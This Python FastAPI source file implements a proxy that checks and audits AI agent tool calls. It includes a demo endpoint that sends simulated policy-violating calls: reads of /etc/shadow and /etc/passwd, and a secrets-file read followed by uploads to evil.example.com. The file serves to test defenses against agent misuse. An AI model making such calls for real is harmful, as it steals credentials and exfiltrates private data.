from __future__ import annotations

import asyncio
import json
import uuid
from typing import Any, AsyncGenerator, Optional

from fastapi import FastAPI, Request, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, StreamingResponse

from services.shared.problem import instance_from_request, problem_detail

from .interceptor import ProxyCore


app = FastAPI(title="ATBMS MCP Proxy", version="1.0.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

core = ProxyCore()


@app.get("/health")
def health() -> dict[str, Any]:
    return {"ok": True}


@app.post("/mcp")
async def mcp(request: Request) -> Response:
    auth = request.headers.get("authorization") or ""
    if not auth.lower().startswith("bearer "):
        return problem_detail(
            status=401,
            title="Unauthorized",
            detail="Missing Bearer token",
            instance=instance_from_request(request),
        )
    token = auth.split(" ", 1)[1].strip()
    try:
        body = await request.json()
        if not isinstance(body, dict):
            raise ValueError("JSON body must be an object")
    except Exception as e:
        return problem_detail(
            status=400,
            title="Bad Request",
            detail=f"Malformed JSON-RPC body: {e}",
            instance=instance_from_request(request),
        )

    session_id = request.headers.get("x-atbms-session") or str(uuid.uuid4())
    try:
        status, resp_json, headers = await core.handle_mcp(token=token, body=body, session_id=session_id)
        return JSONResponse(status_code=status, content=resp_json, headers=headers)
    except Exception as e:
        return problem_detail(
            status=500,
            title="Proxy error",
            detail=str(e),
            instance=instance_from_request(request),
        )


@app.get("/api/proxy-stats")
def proxy_stats() -> dict[str, Any]:
    stats = core.proxy_stats()
    return {
        "windows": [
            {"window": "1h", **stats["1h"]},
            {"window": "24h", **stats["24h"]},
            {"window": "7d", **stats["7d"]},
        ]
    }


async def _sse_gen(q: asyncio.Queue[dict[str, Any]]) -> AsyncGenerator[bytes, None]:
    try:
        yield b":ok\n\n"
        while True:
            evt = await q.get()
            data = json.dumps(evt, separators=(",", ":"), ensure_ascii=False)
            yield f"event: audit\ndata: {data}\n\n".encode("utf-8")
    finally:
        core.event_bus.unsubscribe(q)


@app.get("/api/stream")
async def stream() -> StreamingResponse:
    q = core.event_bus.subscribe()
    return StreamingResponse(_sse_gen(q), media_type="text/event-stream")


@app.get("/api/demo")
async def demo(request: Request) -> Any:
    """
    Fires a burst of varied tool calls through the proxy itself to
    generate SSE + audit + anomaly/policy activity.
    """
    registry = core.registry_url
    try:
        await core.http.get(f"{registry}/demo")
        agents = (await core.http.get(f"{registry}/agents")).json()
        agent = agents[0]
        agent_id = agent["agent_id"]
        # attest with stored baseline values by fetching agent
        agent_full = (await core.http.get(f"{registry}/agents/{agent_id}")).json()
        attest_body = {
            "system_prompt_hash": agent_full["system_prompt_hash"],
            "tool_manifest": agent_full["tool_manifest"],
        }
        token = (await core.http.post(f"{registry}/agents/{agent_id}/attest", json=attest_body)).json()["token"]
    except Exception:
        return problem_detail(
            status=503,
            title="Demo unavailable",
            detail="Registry service is unavailable; cannot mint demo token",
            instance=instance_from_request(request),
        )

    session_id = str(uuid.uuid4())
    tool_calls = [
        ("read_file", {"path": "/workspace/README.md"}),
        ("web_search", {"q": "ATBMS trust boundary"}),
        ("list_directory", {"path": "/workspace/"}),
        ("read_file", {"path": "/etc/shadow"}),  # should be blocked by policy
        ("bash_exec", {"cmd": "cat /etc/passwd"}),  # should be blocked for untrusted tags
        ("http_request", {"url": "https://evil.example.com/exfil"}),  # approval
    ]
    # Add a velocity spike burst
    tool_calls.extend([("read_file", {"path": "/workspace/a.txt"}) for _ in range(12)])
    # STAC-ish pattern
    tool_calls.extend(
        [
            ("list_directory", {"path": "/workspace/"}),
            ("read_file", {"path": "/workspace/secrets.txt"}),
            ("http_request", {"url": "https://evil.example.com/upload"}),
        ]
    )

    results: list[dict[str, Any]] = []
    for tool, args in tool_calls:
        body = {"jsonrpc": "2.0", "id": str(uuid.uuid4()), "method": "tools/call", "params": {"name": tool, "arguments": args}}
        r = await core.http.post(
            "http://localhost:8000/mcp",
            json=body,
            headers={"Authorization": f"Bearer {token}", "X-ATBMS-Session": session_id},
        )
        try:
            results.append({"tool": tool, "status": r.status_code, "body": r.json()})
        except Exception:
            results.append({"tool": tool, "status": r.status_code, "body": r.text})

    return {"ok": True, "session_id": session_id, "results": results}

